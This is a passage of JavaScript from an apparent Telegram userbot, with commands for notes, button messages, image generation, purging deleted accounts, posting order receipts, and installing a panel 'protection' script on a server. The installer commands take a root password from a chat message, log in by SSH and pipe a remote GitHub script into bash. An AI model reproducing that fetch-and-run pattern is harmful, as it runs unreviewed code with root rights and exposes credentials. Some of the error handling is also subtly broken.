      message: `<blockquote>❌ ɴᴏᴛᴇ <b>${name}</b> ᴛɪᴅᴀᴋ ᴅɪᴛᴇᴍᴜᴋᴀɴ!</blockquote>`,
      parseMode: "html",
      replyTo: msg.id
    });
    return;
  }

  if (note.type === "photo") {
    await client.sendFile(msg.chatId, {
      file: note.path,
      caption: `<blockquote>${note.caption}</blockquote>`,
      parseMode: "html",
      replyTo: msg.id
    });
  } else {
    await client.sendMessage(msg.chatId, {
      message: `<blockquote>${note.content}</blockquote>`,
      parseMode: "html",
      replyTo: msg.id
    });
  }
}

if(msg.text?.startsWith(`${prefix}listnote`)) {
  const userId = msg.senderId.toString();
  const userNotes = getUserNotes(userId);
  const keys = Object.keys(userNotes);

  if (!keys.length) {
    await client.sendMessage(msg.chatId, {
      message: `<blockquote>📃 ʙᴇʟᴜᴍ ᴀᴅᴀ ɴᴏᴛᴇ ᴛᴇʀsɪᴍᴘᴀɴ</blockquote>`,
      parseMode: "html",
      replyTo: msg.id
    });
    return;
  }

  const list = keys.map((n, i) => `\n│ ${i + 1}. ${n}`).join("");
  await client.sendMessage(msg.chatId, {
    message: `<blockquote>📋 <b>ᴅᴀғᴛᴀʀ ɴᴏᴛᴇ:</b>\n${list}</blockquote>`,
    parseMode: "html",
    replyTo: msg.id
  });
}

if(msg.text?.startsWith(`${prefix}cnote`)) {
  const userId = msg.senderId.toString();
  const args = msg.text.split(" ").slice(1);
  const userNotes = getUserNotes(userId);
  const input = args[0]?.toLowerCase();

  if (!input) {
    await client.sendMessage(msg.chatId, {
      message: `<blockquote>⚠️ <b>ғᴏʀᴍᴀᴛ:</b> ${prefix}cnote (nama atau no)</blockquote>`,
      parseMode: "html",
      replyTo: msg.id
    });
    return;
  }

  let noteName = null;

  if (/^\d+$/.test(input)) {
    const noteNumber = parseInt(input);
    const noteKeys = Object.keys(userNotes);
    
    if (noteNumber < 1 || noteNumber > noteKeys.length) {
      await client.sendMessage(msg.chatId, {
        message: `<blockquote>❌ <b>Nomor ${noteNumber}</b> ᴛɪᴅᴀᴋ ᴅɪᴛᴇᴍᴜᴋᴀɴ!\nGunakan <code>${prefix}listnote</code> untuk melihat daftar note.</blockquote>`,
        parseMode: "html",
        replyTo: msg.id
      });
      return;
    }
    
    noteName = noteKeys[noteNumber - 1];
  } else {
    noteName = input;
  }

  if (!userNotes[noteName]) {
    await client.sendMessage(msg.chatId, {
      message: `<blockquote>❌ ɴᴏᴛᴇ <b>${noteName}</b> ᴛɪᴅᴀᴋ ᴅɪᴛᴇᴍᴜᴋᴀɴ!</blockquote>`,
      parseMode: "html",
      replyTo: msg.id
    });
    return;
  }

  if (userNotes[noteName].type === "photo" && fs.existsSync(userNotes[noteName].path)) {
    try {
      fs.unlinkSync(userNotes[noteName].path);
    } catch (err) {
      console.error("Gagal menghapus file:", err);
    }
  }

  delete userNotes[noteName];
  saveUserNotes(userId, userNotes);

  await client.sendMessage(msg.chatId, {
    message: `<blockquote>✅️ ɴᴏᴛᴇ: <b>${noteName}</b> ʙᴇʀʜᴀsɪʟ ᴅɪʜᴀᴘᴜs!</blockquote>`,
    parseMode: "html",
    replyTo: msg.id
  });
}

        // .button
        if (msg.text?.startsWith(`${prefix}button`)) {
    const args = msg.text.split(" ");
    
    if (args.length < 2) {
        await client.sendMessage(msg.chatId, {
            message: `<blockquote><b>ʙᴜᴛᴛᴏɴ ᴍᴀᴋᴇʀ</b>

➤ <b>ғᴏʀᴍᴀᴛ:</b>\n<code>${prefix}button [text] -/ [button1]:[url1] | [button2]:[url2]</code>

➤ <b>ᴄᴏɴᴛᴏʜ:</b>\n<code>${prefix}button Hallo -/ Google:https://google.com</code></blockquote>`,
            parseMode: "html",
            replyTo: msg.id
        });
        return;
    }
    
    const fullText = msg.text.substring(prefix.length + 7).trim();
    
    if (!fullText.includes("-/")) {
        await client.sendMessage(msg.chatId, {
            message: `<blockquote>⚠️ <b>ғᴏʀᴍᴀᴛ sᴀʟᴀʜ!</b>\nɢᴜɴᴀᴋᴀɴ <code>-/</code> ᴜɴᴛᴜᴋ ᴍᴇᴍɪsᴀʜᴋᴀɴ ᴛᴇᴋs ᴅᴀɴ ʙᴜᴛᴛᴏɴ.

➤ <b>ᴄᴏɴᴛᴏʜ:</b>\n<code>${prefix}button Text -/ Button:URL</code></blockquote>`,
            parseMode: "html",
            replyTo: msg.id
        });
        return;
    }
    
    const [textPart, buttonPart] = fullText.split("-/");
    const text = textPart.trim();
    const buttonsConfig = buttonPart.trim();
    
    if (!text) {
        await client.sendMessage(msg.chatId, {
            message: `<blockquote>⚠️ <b>ᴛᴇᴋs ᴛɪᴅᴀᴋ ʙᴏʟᴇʜ ᴋᴏsᴏɴɢ!</b>\nᴛᴀᴍʙᴀʜᴋᴀɴ ᴛᴇᴋs sᴇʙᴇʟᴜᴍ <code>-/</code></blockquote>`,
            parseMode: "html",
            replyTo: msg.id
        });
        return;
    }
    
    if (!buttonsConfig) {
        await client.sendMessage(msg.chatId, {
            message: `<blockquote>⚠️ <b>ʙᴜᴛᴛᴏɴ ᴛɪᴅᴀᴋ ʙᴏʟᴇʜ ᴋᴏsᴏɴɢ!</b>\nᴛᴀᴍʙᴀʜᴋᴀɴ ʙᴜᴛᴛᴏɴ sᴇᴛᴇʟᴀʜ <code>-/</code></blockquote>`,
            parseMode: "html",
            replyTo: msg.id
        });
        return;
    }
    
    const inlineKeyboard = [];
    
    const buttonRows = buttonsConfig.split("||").map(row => row.trim());
    
    for (const rowConfig of buttonRows) {
        const rowButtons = [];
        const buttonItems = rowConfig.split("|").map(item => item.trim());
        
        for (const btnConfig of buttonItems) {
            if (btnConfig.includes(":")) {
                const parts = btnConfig.split(":");
                const btnText = parts[0].trim();
                const btnUrl = parts.slice(1).join(":").trim();
                
                if (btnText && btnUrl) {
                    let finalUrl = btnUrl;
                    
                    if (!btnUrl.match(/^(https?|ftp|tg|mailto):\/\//)) {
                        if (btnUrl.startsWith("@")) {
                            finalUrl = "https://t.me/" + btnUrl.substring(1);
                        } else if (/^\+?\d+$/.test(btnUrl.replace(/\D/g, ''))) {
                            const cleanNumber = btnUrl.replace(/\D/g, '');
                            finalUrl = "https://wa.me/" + cleanNumber;
                        } else if (btnUrl.includes(".")) {
                            finalUrl = "https://" + btnUrl;
                        } else if (btnUrl.includes("@")) {
                            finalUrl = "mailto:" + btnUrl;
                        }
                    }
                    
                    rowButtons.push({
                        text: btnText,
                        url: finalUrl
                    });
                }
            }
        }
        
        if (rowButtons.length > 0) {
            inlineKeyboard.push(rowButtons);
        }
    }
    
    if (inlineKeyboard.length === 0) {
        await client.sendMessage(msg.chatId, {
            message: `<blockquote>⚠️ <b>ᴛɪᴅᴀᴋ ᴀᴅᴀ ʙᴜᴛᴛᴏɴ ʏᴀɴɢ ᴠᴀʟɪᴅ!</b>

➤ <b>ғᴏʀᴍᴀᴛ:</b> <code>Text:URL</code>

➤ <b>ᴄᴏɴᴛᴏʜ:</b>\n<code>Google:https://google.com</code></blockquote>`,
            parseMode: "html",
            replyTo: msg.id
        });
        return;
    }
    
    const botUsername = 'Aksesadd_bot';
    let inlineSuccess = false;
    
    try {
        try { 
            await client.deleteMessages(msg.chatId, [msg.id], { revoke: true }); 
        } catch (e) { }
        
        const botEntity = await client.getInputEntity("@" + botUsername);
        
        let inputPeer;
        try {
            if (msg._inputChat) {
                inputPeer = msg._inputChat;
            } else if (msg.inputChat) {
                inputPeer = msg.inputChat;
            } else if (typeof msg.getInputChat === 'function') {
                inputPeer = await msg.getInputChat();
            } else if (msg.peerId) {
                const peerId = msg.peerId;
                if (peerId.className === 'PeerUser') {
                    const sender = await msg.getSender();
                    if (sender) {
                        inputPeer = new Api.InputPeerUser({
                            userId: sender.id,
                            accessHash: sender.accessHash || BigInt(0)
                        });
                    }
                } else if (peerId.className === 'PeerChat') {
                    inputPeer = new Api.InputPeerChat({
                        chatId: peerId.chatId
                    });
                } else if (peerId.className === 'PeerChannel') {
                    const chat = await msg.getChat();
                    inputPeer = new Api.InputPeerChannel({
                        channelId: peerId.channelId,
                        accessHash: chat?.accessHash || BigInt(0)
                    });
                }
            }
            if (!inputPeer) {
                inputPeer = new Api.InputPeerSelf();
            }
        } catch (peerErr) {
            inputPeer = new Api.InputPeerSelf();
        }
        
        const uniqueId = `${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
        const query = `button_${uniqueId}`;
        
        if (!global.buttonData) global.buttonData = {};
        global.buttonData[query] = {
            text: text,
            buttons: inlineKeyboard,
            created: Date.now()
        };
        
        const results = await client.invoke(
            new Api.messages.GetInlineBotResults({
                bot: botEntity,
                peer: inputPeer,
                query: query,
                offset: ""
            })
        );
        
        if (results && results.results && results.results.length > 0) {
            try {
                await client.invoke(
                    new Api.messages.SendInlineBotResult({
                        peer: inputPeer,
                        queryId: results.queryId,
                        id: results.results[0].id,
                        randomId: BigInt(Math.floor(Math.random() * 1e15))
                    })
                );
                inlineSuccess = true;
            } catch (sendErr) {

            }
        } else {

        }
    } catch (e) {

    }
    
    if (!inlineSuccess) {
        try {
            await client.sendMessage(msg.chatId, {
                message: text,
                parseMode: "html",
                buttons: inlineKeyboard
            });
        } catch (fallbackErr) {
            const buttonLinks = inlineKeyboard.flat().map((btn, idx) => 
                `${idx + 1}. ${btn.text}: ${btn.url}`
            ).join("\n");
        }
    }
    
    return;
}

       // .brat
       if (msg.text?.startsWith(`${prefix}brat`)) {
  (async () => {
    let tempFilePath = null;
    
    try {
      const chatId = msg.chatId || msg.chat?.id;
      const text = msg.text || "";
      
      const bratText = text.replace(`${prefix}brat`, '').trim();
      
      if (!bratText) {
        await client.sendMessage(chatId, {
          message: `<blockquote>⚠️ Format: <code>${prefix}brat &lt;teks&gt;</code>\n\nContoh: <code>${prefix}brat Hello World</code></blockquote>`,
          parseMode: "html",
          replyTo: msg.id
        });
        return;
      }

      const loadingMsg = await client.sendMessage(chatId, {
        message: `<blockquote>🚀 Otw membuat foto brat: <b>${bratText}</b></blockquote>`,
        parseMode: "html",
        replyTo: msg.id
      });

      const encodedText = encodeURIComponent(bratText);
      const apiUrl = `https://api.siputzx.my.id/api/m/brat?text=${encodedText}&isAnimated=false&delay=100`;
      
      const response = await axios.get(apiUrl, {
        responseType: 'arraybuffer',
        timeout: 30000
      });

      if (!response.data || response.data.length === 0) {
        throw new Error('API tidak mengembalikan gambar');
      }

      const tempDir = path.join(__dirname, 'temp');
      if (!fs.existsSync(tempDir)) {
        fs.mkdirSync(tempDir, { recursive: true });
      }
      
      tempFilePath = path.join(tempDir, `brat_${Date.now()}.png`);
      fs.writeFileSync(tempFilePath, response.data);
                  
      await client.deleteMessages(chatId, [loadingMsg.id], { revoke: true }).catch(() => {});
      
      await client.sendFile(chatId, {
        file: tempFilePath,
        forceDocument: false,
        replyTo: msg.id
      });
      
    } catch (error) {
      console.error('Brat command error:', error);
      
      if (loadingMsg) {
        await client.deleteMessages(chatId, [loadingMsg.id], { revoke: true }).catch(() => {});
      }
      
      let errorMsg = `Gagal membuat sticker brat: ${error.message}`;
      if (error.response?.status === 404) {
        errorMsg = 'API sedang tidak tersedia, coba lagi nanti';
      } else if (error.code === 'ECONNABORTED') {
        errorMsg = 'Timeout: API terlalu lama merespon';
      } else if (error.message.includes('API tidak mengembalikan gambar')) {
        errorMsg = 'API tidak mengembalikan gambar yang valid';
      }
      
      await client.sendMessage(msg.chatId, {
        message: `<blockquote>❌ ${errorMsg}</blockquote>`,
        parseMode: "html",
        replyTo: msg.id
      });
    } finally {
      if (tempFilePath && fs.existsSync(tempFilePath)) {
        try {
          fs.unlinkSync(tempFilePath);
        } catch (deleteError) {
          console.error('Gagal menghapus file temp:', deleteError);
        }
      }
    }
  })();
  return;
}

       // .zombies
       if (msg.text?.startsWith(`${prefix}zombies`)) {
    (async () => {
        try {
            const chatId = msg.chatId;
            const senderId = msg.sender?.id || msg.from?.id || msg.author?.id;

            if (!msg.isGroup && !msg.isSuperGroup && !msg.isChannel) {
                await client.sendMessage(chatId, {
                    message: "<blockquote>⚠️ ᴘᴇʀɪɴᴛᴀʜ ɪɴɪ ʜᴀɴʏᴀ ʙɪsᴀ ᴅɪ ɢʀᴏᴜᴘ</blockquote>",
                    parseMode: "html",
                    replyTo: msg.id
                });
                return;
            }

            try {
                const chat = await client.getChat(chatId);
                const participant = await client.getParticipant(chatId, senderId);
                
                if (!participant.adminRights && !participant.isAdmin) {
                    await client.sendMessage(chatId, {
                        message: "<blockquote>❌ ʜᴀɴʏᴀ ᴀᴅᴍɪɴ ʏᴀɴɢ ʙɪsᴀ ᴍᴇɴɢɢᴜɴᴀᴋᴀɴ ᴘᴇʀɪɴᴛᴀʜ ɪɴɪ</blockquote>",
                        parseMode: "html",
                        replyTo: msg.id
                    });
                    return;
                }
            } catch (adminError) {
                console.error("Admin check error:", adminError);
            }

            let loadingMsg;
            try {
                loadingMsg = await client.sendMessage(chatId, {
                    message: "<blockquote>🔍 ᴍᴇɴᴄᴀʀɪ ᴀᴋᴜɴ ᴛᴇʀʜᴀᴘᴜs...</blockquote>",
                    parseMode: "html",
                    replyTo: msg.id
                });
            } catch {
                loadingMsg = null;
            }
            
            let participants = [];
            try {
                if (typeof client.getParticipants === "function") {
                    participants = await client.getParticipants(chatId);
                } else if (typeof client.getChatMembers === "function") {
                    participants = await client.getChatMembers(chatId);
                } else if (typeof client.getFullChat === "function") {
                    const full = await client.getFullChat(chatId);
                    participants = full?.participants || [];
                } else if (typeof client.getChat === "function") {
                    const chat = await client.getChat(chatId);
                    participants = chat.participants || [];
                } else {
                    throw new Error("Client tidak mendukung pengambilan member");
                }
            } catch (e) {
                if (loadingMsg) {
                    try { 
                        await client.deleteMessages(chatId, [loadingMsg.id || loadingMsg]); 
                    } catch {}
                }
                await client.sendMessage(chatId, {
                    message: `<blockquote>❌ ɢᴀɢᴀʟ ᴍᴇɴɢᴀᴍʙɪʟ ᴀᴋᴜɴ ᴛᴇʀʜᴀᴘᴜs ᴅᴀʀɪ ɢʀᴏᴜᴘ: ${e.message}</blockquote>`,
                    parseMode: "html",
                    replyTo: msg.id
                });
                return;
            }
            
            const zombies = [];
            
            for (const participant of participants) {
                try {
                    const user = participant.user || participant || {};
                    const userId = user.id || participant.id;
                    
                    if (!userId) continue;
                    
                    if (user.bot || participant.bot) continue;
                    
                    try {
                        const member = await client.getParticipant(chatId, userId);
                        if (member.adminRights || member.isAdmin) continue;
                    } catch {}
                    
                    const firstName = user.firstName || "";
                    const lastName = user.lastName || "";
                    const username = user.username || "";
                    const name = `${firstName} ${lastName}`.trim();
                    
                    const isDeleted = 
                        user.deleted === true ||
                        user.isDeleted === true ||
                        (!firstName && !lastName && !username) ||
                        /deleted|account|removed|none|user/i.test(username) ||
                        /deleted|account|removed|user \d+/i.test(name);
                    
                    if (isDeleted) {
                        zombies.push({
                            id: userId,
                            name: name || username || `User ${userId}`,
                            username: username
                        });
                    }
                } catch (error) {
                    console.error("Error checking participant:", error);
                }
            }
            
            if (zombies.length === 0) {
                if (loadingMsg) {
                    try { 
                        await client.deleteMessages(chatId, [loadingMsg.id || loadingMsg], { revoke: true }); 
                    } catch {}
                }
                await client.sendMessage(chatId, {
                    message: "<blockquote>✅ ᴛɪᴅᴀᴋ ᴀᴅᴀ ᴀᴋᴜɴ ᴛᴇʀʜᴀᴘᴜs ᴅɪ ɢʀᴏᴜᴘ ɪɴɪ</blockquote>",
                    parseMode: "html",
                    replyTo: msg.id
                });
                return;
            }
            
            if (loadingMsg) {
                try {
                    await client.editMessage(chatId, {
                        messageId: loadingMsg.id || loadingMsg,
                        text: `<blockquote>ᴅɪᴛᴇᴍᴜᴋᴀɴ ${zombies.length} ᴀᴋᴜɴ ᴛᴇʀʜᴀᴘᴜs\n\n⏳ ᴍᴇᴍᴘʀᴏsᴇs ᴘᴇɴɢʜᴀᴘᴜsᴀɴ...</blockquote>`,
                        parseMode: "html"
                    });
                } catch {
                    try {
                        await client.deleteMessages(chatId, [loadingMsg.id || loadingMsg]);
                        loadingMsg = await client.sendMessage(chatId, {
                            message: `<blockquote>ᴅɪᴛᴇᴍᴜᴋᴀɴ ${zombies.length} ᴀᴋᴜɴ ᴛᴇʀʜᴀᴘᴜs\n\n⏳ ᴍᴇᴍᴘʀᴏsᴇs ᴘᴇɴɢʜᴀᴘᴜsᴀɴ...</blockquote>`,
                            parseMode: "html",
                            replyTo: msg.id
                        });
                    } catch {}
                }
            }

            let removed = 0, failed = 0;
            let zombiesList = "<blockquote><b>ᴅᴀғᴛᴀʀ ᴀᴋᴜɴ ᴛᴇʀʜᴀᴘᴜs</b>\n\n";

            for (let i = 0; i < zombies.length; i++) {
                const zombie = zombies[i];
                
                try {
                    let kicked = false;
                    
                    if (typeof client.kickParticipant === "function") {
                        await client.kickParticipant(chatId, zombie.id);
                        kicked = true;
                    } else if (typeof client.kick === "function") {
                        await client.kick(chatId, zombie.id);
                        kicked = true;
                    } else if (typeof client.removeParticipant === "function") {
                        await client.removeParticipant(chatId, zombie.id);
                        kicked = true;
                    } else if (typeof client.editChatAdmin === "function") {
                        await client.editChatAdmin(chatId, zombie.id, false);
                        kicked = true;
                    }
                    
                    if (kicked) {
                        removed++;
                        zombiesList += `✅ <code>${zombie.id}</code> - ${zombie.name}\n`;
                    } else {
                        failed++;
                        zombiesList += `❌ <code>${zombie.id}</code> - ${zombie.name}\n`;
                    }
                } catch (kickError) {
                    console.error(`Failed to kick ${zombie.id}:`, kickError);
                    failed++;
                    zombiesList += `❌ <code>${zombie.id}</code> - ${zombie.name}\n`;
                }

                await new Promise(r => setTimeout(r, 1000));
                
                if (loadingMsg && (i + 1) % 5 === 0) {
                    try {
                        await client.editMessage(chatId, {
                            messageId: loadingMsg.id || loadingMsg,
                            text: `<blockquote>• ᴘʀᴏɢʀᴇss: ${i + 1}/${zombies.length}\n` +
                                  `• ᴅɪʜᴀᴘᴜs: ${removed}\n` +
                                  `• ɢᴀɢᴀʟ: ${failed}</blockquote>`,
                            parseMode: "html"
                        });
                    } catch {}
                }
            }

            if (loadingMsg) {
                try { 
                    await client.deleteMessages(chatId, [loadingMsg.id || loadingMsg], { revoke: true }); 
                } catch {}
            }
            
            if (zombiesList.length > 3000) {
                zombiesList = zombiesList.substring(0, 3000) + "\n\n... (terlalu panjang)";
            } else {
                zombiesList += "</blockquote>";
            }
            
            if (zombies.length <= 20) {
                await client.sendMessage(chatId, {
                    message: zombiesList,
                    parseMode: "html",
                    replyTo: msg.id
                });
            }
            
            await client.sendMessage(chatId, {
                message: `<blockquote>
<b>ᴛᴏᴛᴀʟ ᴢᴏᴍʙɪᴇs:</b> ${zombies.length}
• <b>ʙᴇʀʜᴀsɪʟ:</b> ${removed}
• <b>ɢᴀɢᴀʟ:</b> ${failed}</blockquote>`,
                parseMode: "html",
                replyTo: msg.id
            });
            
        } catch (err) {
            console.error("Zombies command error:", err);
            
            if (loadingMsg) {
                try { 
                    await client.deleteMessages(msg.chatId, [loadingMsg.id || loadingMsg]); 
                } catch {}
            }
            
            await client.sendMessage(msg.chatId, {
                message: `<blockquote>❌ ᴛᴇʀᴊᴀᴅɪ ᴋᴇsᴀʟᴀʜᴀɴ: ${err.message}</blockquote>`,
                parseMode: "html",
                replyTo: msg.id
            });
        }
    })();
    return;
}

       // .done
       if (msg.text?.startsWith(`${prefix}done`)) {
    (async () => {
        try {
            const chatId = msg.chatId;
            const userId = msg.sender?.id || msg.from?.id || msg.author?.id;
            
            const processMsg = await client.sendMessage(chatId, {
                message: "<blockquote>⏳ <b>Memproses transaksi...</b></blockquote>",
                parseMode: "html",
                replyTo: msg.id
            });
            
            await new Promise(resolve => setTimeout(resolve, 5000));
            
            try {
                const args = msg.text.split(' ').slice(1);
                
                if (args.length === 0) {
                    await client.deleteMessages(chatId, [processMsg.id || processMsg], { revoke: true });
                    
                    await client.sendMessage(chatId, {
                        message: `<blockquote>❌ <b>Format:</b> <code>${prefix}done name item,price,payment</code></blockquote>`,
                        parseMode: "html",
                        replyTo: msg.id
                    });
                    return;
                }
                
                const text = args.join(' ');
                
                const parts = text.split(',');
                
                if (parts.length < 2) {
                    await client.deleteMessages(chatId, [processMsg.id || processMsg], { revoke: true });
                    
                    await client.sendMessage(chatId, {
                        message: `<blockquote>❌ <b>Format:</b> <code>${prefix}done name item,price,payment</code></blockquote>`,
                        parseMode: "html",
                        replyTo: msg.id
                    });
                    return;
                }
                
                const nameItem = parts[0].trim();
                const price = parts[1].trim();
                const payment = parts.length > 2 ? parts[2].trim() : "Lainnya";
                
                const now = new Date();
                const time = now.toLocaleString('id-ID', {
                    year: 'numeric',
                    month: 'long',
                    day: 'numeric',
                    hour: '2-digit',
                    minute: '2-digit',
                    second: '2-digit'
                });
                
                const transactionMessage = 
                    `<blockquote>「 𝗧𝗥𝗔𝗡𝗦𝗔𝗞𝗦𝗜 𝗕𝗘𝗥𝗛𝗔𝗦𝗜𝗟 」</blockquote>\n\n` +
                    `<blockquote>📦 <b>ʙᴀʀᴀɴɢ :</b> ${nameItem}\n` +
                    `💸 <b>ɴᴏᴍɪɴᴀʟ :</b> Rp ${price}\n` +
                    `🕰️ <b>ᴡᴀᴋᴛᴜ :</b> ${time}\n` +
                    `💳 <b>ᴘᴀʏᴍᴇɴᴛ :</b> ${payment}</blockquote>\n\n` +
                    `<blockquote>ᴛᴇʀɪᴍᴀᴋᴀsɪʜ ᴛᴇʟᴀʜ ᴏʀᴅᴇʀ ✅</blockquote>`;
                
                await client.deleteMessages(chatId, [processMsg.id || processMsg], { revoke: true });
                
                await client.sendMessage(chatId, {
                    message: transactionMessage,
                    parseMode: "html",
                    replyTo: msg.id
                });
                
            } catch (error) {
                console.error("Error processing transaction:", error);
                
                try {
                    await client.deleteMessages(chatId, [processMsg.id || processMsg], { revoke: true });
                } catch {}
                
                await client.sendMessage(chatId, {
                    message: `<blockquote>❌ <b>Error:</b> ${error.message}</blockquote>`,
                    parseMode: "html",
                    replyTo: msg.id
                });
            }
            
        } catch (error) {
            console.error("Done command error:", error);
            await client.sendMessage(msg.chatId, {
                message: `<blockquote>❌ Error: ${error.message}</blockquote>`,
                parseMode: "html",
                replyTo: msg.id
            });
        }
    })();
    return;
}

       // .installprotect1
       if (msg.text?.startsWith(`${prefix}installprotect1`)) {
    (async () => {
        try {
            const chatId = msg.chatId;
            const args = msg.text.split(' ').slice(1);
            
            const input = args.join(" ").trim();
            
            if (!input.includes(',')) {
                await client.sendMessage(chatId, {
                    message: `<blockquote>⚠️ <b>ғᴏʀᴍᴀᴛ:</b> ${prefix}installprotect1 ip,password</blockquote>`,
                    parseMode: "html",
                    replyTo: msg.id
                });
                return;
            }
            
            const [ipvps, pwvps] = input.split(',').map(i => i.trim());
            
            if (!ipvps || !pwvps) {
                await client.sendMessage(chatId, {
                    message: `<blockquote>⚠️ ɪᴘ ᴀᴛᴀᴜ ᴘᴀssᴡᴏʀᴅ ᴛɪᴅᴀᴋ ᴠᴀʟɪᴅ</blockquote>`,
                    parseMode: "html",
                    replyTo: msg.id
                });
                return;
            }
            
            const ipRegex = /^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$/;
            if (!ipRegex.test(ipvps)) {
                await client.sendMessage(chatId, {
                    message: `<blockquote>⚠️ Format IP tidak valid! Contoh: 192.168.1.1</blockquote>`,
                    parseMode: "html",
                    replyTo: msg.id
                });
                return;
            }
            
            const scriptURL = 'https://raw.githubusercontent.com/ObyMoods/Antirusuh/main/protect1.sh';
            
            let loadingMsg;
            try {
                loadingMsg = await client.sendMessage(chatId, {
                    message: `<blockquote>🚀 <b>INSTALLING PROTECT PANEL 1</b>

🌐 <b>VPS:</b> ${ipvps}
🔑 <b>Status:</b> Connecting...</blockquote>`,
                    parseMode: "html",
                    replyTo: msg.id
                });
            } catch (loadingError) {
                console.error("Gagal kirim loading:", loadingError);
                loadingMsg = null;
            }
            
            let installationResult = '';
            let success = false;
            
            try {
                const { Client } = require('ssh2');
                const conn = new Client();
                
                if (loadingMsg) {
                    try {
                        await client.editMessage(chatId, {
                            messageId: loadingMsg.id || loadingMsg,
                            text: `<blockquote>🚀 <b>INSTALLING PROTECT PANEL 1</b>

🌐 <b>VPS:</b> ${ipvps}
🔑 <b>Status:</b> Authenticating...</blockquote>`,
                            parseMode: "html"
                        });
                    } catch {}
                }
                
                await new Promise((resolve, reject) => {
                    let timeout = setTimeout(() => {
                        conn.end();
                        installationResult = '❌ Connection timeout: SSH took too long to respond';
                        resolve();
                    }, 30000);
                    
                    conn.on('ready', () => {
                        clearTimeout(timeout);
                        
                        if (loadingMsg) {
                            try {
                                client.editMessage(chatId, {
                                    messageId: loadingMsg.id || loadingMsg,
                                    text: `<blockquote>🚀 <b>INSTALLING PROTECT PANEL 1</b>

🌐 <b>VPS:</b> ${ipvps}
🔑 <b>Status:</b> Installing script...</blockquote>`,
                                    parseMode: "html"
                                }).catch(() => {});
                            } catch {}
                        }
                        
                        conn.exec(`curl -fsSL ${scriptURL} | bash -s`, (err, stream) => {
                            if (err) {
                                installationResult = `❌ Execution Error: ${err.message}`;
                                conn.end();
                                resolve();
                                return;
                            }
                            
                            let output = '';
                            
                            stream.on('data', (data) => {
                                output += data.toString();
                            });
                            
                            stream.stderr.on('data', (data) => {
                                output += `\n[ERROR] ${data.toString()}`;
                            });
                            
                            stream.on('close', (code, signal) => {
                                conn.end();
                                success = (code === 0);
                                installationResult = output.trim() || 'No output';
                                resolve();
                            });
                        });
                    });
                    
                    conn.on('error', (err) => {
                        clearTimeout(timeout);
                        installationResult = `❌ Connection Error: ${err.message}`;
                        resolve();
                    });
                    
                    conn.connect({
                        host: ipvps,
                        port: 22,
                        username: 'root',
                        password: pwvps,
                        readyTimeout: 20000
                    });
                });
                
            } catch (sshError) {
                installationResult = `❌ SSH Error: ${sshError.message}`;
                success = false;
            }
            
            if (loadingMsg) {
                try {
                    await client.deleteMessages(chatId, [loadingMsg.id || loadingMsg], { revoke: true });
                } catch (deleteError) {
                    console.warn("Gagal hapus loading message:", deleteError.message);
                }
            }
            
            let displayOutput = installationResult;
            if (displayOutput.length > 1000) {
                displayOutput = displayOutput.substring(0, 1000) + "\n\n... (output terlalu panjang)";
            }
            
            if (success) {
                await client.sendMessage(chatId, {
                    message: `<blockquote>✅ <b>ɪɴsᴛᴀʟʟ ᴘʀᴏᴛᴇᴄᴛɪᴏɴ ᴘᴛᴇʀᴏᴅᴀᴄᴛʏʟ 1 ʙᴇʀʜᴀsɪʟ</b>

➤ <b>ɪᴘ ᴠᴘs:</b> <code>${ipvps}</code>
➤ <b>sᴛᴀᴛᴜs:</b> sᴜᴄᴄᴇss
➤ <b>ᴘʀᴏᴛᴇᴄᴛɪᴏɴ:</b> protect1.sh

➤ <b>ʜᴀsɪʟ:</b>\n<code>${displayOutput}</code>

<i>© ʙʏ ᴅᴏʏᴀɴɢ</i></blockquote>`,
                    parseMode: "html",
                    replyTo: msg.id
                });
            } else {
                await client.sendMessage(chatId, {
                    message: `<blockquote>❌ <b>ɪɴsᴛᴀʟʟ ᴘʀᴏᴛᴇᴄᴛɪᴏɴ ᴘᴛᴇʀᴏᴅᴀᴄᴛʏʟ 1 ɢᴀɢᴀʟ</b>

➤ <b>ɪᴘ ᴠᴘs:</b> <code>${ipvps}</code>
➤ <b>sᴛᴀᴛᴜs:</b> Failed
➤ <b>ᴘʀᴏᴛᴇᴄᴛɪᴏɴ:</b> protect1.sh

⚠️ <b>ᴇʀʀᴏʀ:</b>\n<code>${displayOutput}</code>

<i>Periksa koneksi SSH dan pastikan VPS aktif</i></blockquote>`,
                    parseMode: "html",
                    replyTo: msg.id
                });
            }
            
        } catch (err) {
            console.error("❌ Error .installprotect1:", err);
            await client.sendMessage(msg.chatId, {
                message: `<blockquote>❌ <b>ᴇʀʀᴏʀ:</b> ${err.message}</blockquote>`,
                parseMode: "html",
                replyTo: msg.id
            });
        }
    })();
    return;
}

if (msg.text?.startsWith(`${prefix}installprotect2`)) {
    (async () => {
        try {
            const chatId = msg.chatId;
            const args = msg.text.split(' ').slice(1);
            
            const input = args.join(" ").trim();
            
            if (!input.includes(',')) {
                await client.sendMessage(chatId, {
                    message: `<blockquote>⚠️ <b>ғᴏʀᴍᴀᴛ:</b> ${prefix}installprotect2 ip,password</blockquote>`,
                    parseMode: "html",
                    replyTo: msg.id
                });
                return;
            }
            
            const [ipvps, pwvps] = input.split(',').map(i => i.trim());
            
            if (!ipvps || !pwvps) {
                await client.sendMessage(chatId, {
                    message: `<blockquote>⚠️ ɪᴘ ᴀᴛᴀᴜ ᴘᴀssᴡᴏʀᴅ ᴛɪᴅᴀᴋ ᴠᴀʟɪᴅ</blockquote>`,
                    parseMode: "html",
                    replyTo: msg.id
                });
                return;
            }
            
            const ipRegex = /^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$/;
            if (!ipRegex.test(ipvps)) {
                await client.sendMessage(chatId, {
                    message: `<blockquote>⚠️ Format IP tidak valid! Contoh: 192.168.1.1</blockquote>`,
                    parseMode: "html",
                    replyTo: msg.id
                });
                return;
            }
            
            const scriptURL = 'https://raw.githubusercontent.com/ObyMoods/Antirusuh/main/protect2.sh';
            
            let loadingMsg;
            try {
                loadingMsg = await client.sendMessage(chatId, {
                    message: `<blockquote>🚀 <b>INSTALLING PROTECT PANEL 2</b>

🌐 <b>VPS:</b> ${ipvps}
🔑 <b>Status:</b> Connecting...</blockquote>`,
                    parseMode: "html",
                    replyTo: msg.id
                });
            } catch (loadingError) {
                console.error("Gagal kirim loading:", loadingError);
                loadingMsg = null;
            }
            
            let installationResult = '';
            let success = false;
            
            try {
                const { Client } = require('ssh2');
                const conn = new Client();
                
                if (loadingMsg) {
                    try {
                        await client.editMessage(chatId, {
                            messageId: loadingMsg.id || loadingMsg,
